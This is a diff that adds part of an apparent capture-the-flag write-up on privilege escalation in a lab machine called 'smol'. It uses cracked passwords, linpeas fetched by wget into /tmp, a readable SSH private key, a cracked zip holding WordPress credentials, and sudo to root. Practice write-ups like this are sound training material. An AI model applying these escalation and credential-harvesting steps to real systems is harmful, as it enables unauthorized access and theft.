@@ -234,3 +234,62 @@ gege: hero_gege@hotmail.com
 diego: sandiegocalifornia
 ```
 
+<img width="555" height="147" alt="Screenshot_2025-10-01_08-34-57" src="https://github.com/user-attachments/assets/76ad87b3-3a71-47a2-9c47-f8473c011e0d" />
+I failed to switch user into `gege`, I confused that even the password in the database is wrong, what should it be the password? However, I successfully switch user into `diego`
+
+<img width="477" height="133" alt="Screenshot_2025-10-01_08-35-29" src="https://github.com/user-attachments/assets/9abf6220-9723-485e-9d54-01d181bffa19" />
+It's time to retrieve the flag
+
+# Privilege Escalation
+I need to import linpeas from my machine for detailed scanning. So I just need to set up a listener in the folder containing linpeas
+```
+python3 -m http.server 1234
+```
+Then using `wget` to import linpeas
+```
+wget http://<MACHINE IP>:1234/linpeas.sh
+```
+The thing is where should I import to? Folder `/tmp` my favorite folder which allow me to change mode permission into executable. Now, run linpeas
+```
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+After observing the output, I got this
+
+<img width="418" height="344" alt="Screenshot_2025-10-01_08-53-16" src="https://github.com/user-attachments/assets/f42d0d8f-c3ce-4957-918e-31a0834d863d" />
+Well, I can actually read the keys which contain private key to get access to server as user `think`
+<img width="373" height="55" alt="Screenshot_2025-10-01_09-07-54" src="https://github.com/user-attachments/assets/eccd4840-47df-4bb0-81b3-b375380bb07f" />
+
+<img width="761" height="836" alt="Screenshot_2025-10-01_09-03-23" src="https://github.com/user-attachments/assets/248c5e4f-bfcf-4c69-aa10-78cefc50829a" />
+Then I just create a file to contain the private key. Boom! I'm `think` user now
+
+<img width="649" height="729" alt="Screenshot_2025-10-01_09-05-33" src="https://github.com/user-attachments/assets/f54b3605-ff64-4c2f-b17e-1c6a8cd60dfc" />
+So I probably do the same thing with this user as well, import linpeas and scan for something interesting (Because I notiec that inside folder `/tmp` of this user has some executable files which is different from `diego`)
+
+<img width="484" height="89" alt="Screenshot_2025-10-01_09-25-42" src="https://github.com/user-attachments/assets/2a4f82bf-0c33-453a-adae-fc98b4d39e1a" />
+I need to have a look at these uncommon files.
+
+If I run this, it will leverage my permission to user `gege`
+<img width="597" height="146" alt="Screenshot_2025-10-01_09-29-25" src="https://github.com/user-attachments/assets/776370b8-83cc-40a2-82bd-47f7b9ed4feb" />
+
+By simple type
+```
+su gege
+```
+Now, I am `gege`, I came across a protected archive there, so transfer this archive into my machine for cracking process.
+
+<img width="760" height="350" alt="Screenshot_2025-10-01_09-37-31" src="https://github.com/user-attachments/assets/38825cd7-c893-47f2-87ad-7a5f081c1632" />
+<img width="725" height="164" alt="Screenshot_2025-10-01_09-38-54" src="https://github.com/user-attachments/assets/8b10d7e1-23fb-452f-be00-5ea5b96f3c0a" />
+
+Wait, is the password identical to the last one I crack before? So I need to unzip the archive to read some confidential information I reckon. And I found `wp_config.php`.
+There are a lot of files to read, but luckily I found `wp-config.php` which contain user `xavi` credential
+<img width="630" height="165" alt="Screenshot_2025-10-01_09-45-08" src="https://github.com/user-attachments/assets/12cf7c85-b88b-4614-a734-0d04a06f569f" />
+
+Becoming `xavi` in one second.
+<img width="945" height="141" alt="Screenshot_2025-10-01_09-48-26" src="https://github.com/user-attachments/assets/f6edb929-c8bb-4d0f-acb4-f526a9480531" />
+
+How easy it is, since xavi has all command permisison on smol, which means that from `xavi` I could turn into `root` faster then I got the final flag. what an exciting journey
+<img width="572" height="256" alt="Screenshot_2025-10-01_09-51-09" src="https://github.com/user-attachments/assets/c1ea44d6-3598-47c2-825e-449bfa54bcfe" />
+
+Happy Hacking!!!
